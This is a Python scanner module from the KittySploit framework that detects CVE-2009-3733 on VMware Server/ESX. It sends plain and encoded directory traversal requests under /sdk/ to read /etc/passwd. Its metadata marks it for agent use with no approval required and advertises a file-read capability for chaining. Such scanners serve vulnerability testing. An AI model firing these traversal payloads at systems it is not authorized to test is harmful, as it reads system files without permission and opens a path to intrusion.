#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2009-3733 via /sdk/ encoded traversal to /etc/passwd on VMware Server/ESX UI port."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VMware - SDK Directory Traversal Detection (CVE-2009-3733)',
        'description': (
            'Detects CVE-2009-3733 via /sdk/ encoded traversal to /etc/passwd on VMware Server/ESX UI port.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2009', 'vmware', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2009-3733',
        ],
        'cve': 'CVE-2009-3733',
    }

    def run(self):
        root = self.http_request(method='GET', path='/', allow_redirects=False)
        body0 = (root.text or '') if root else ''
        if 'VMware ESX' in body0:
            prefix = '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/'
        elif 'VMware Server' in body0:
            prefix = '/sdk/../../../../../../'
        else:
            # try both
            for prefix in (
                '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/',
                '/sdk/../../../../../../',
            ):
                path = prefix + 'etc/passwd'
                r = self.http_request(method='GET', path=path, allow_redirects=False)
                if r and re.search(r'root:.*:0:0:', r.text or ''):
                    self.set_info(severity='high', reason='VMware SDK directory traversal (CVE-2009-3733)', path='/sdk/')
                    return True
            return False
        path = prefix + 'etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(severity='high', reason='VMware SDK directory traversal (CVE-2009-3733)', path='/sdk/')
            return True
        return False

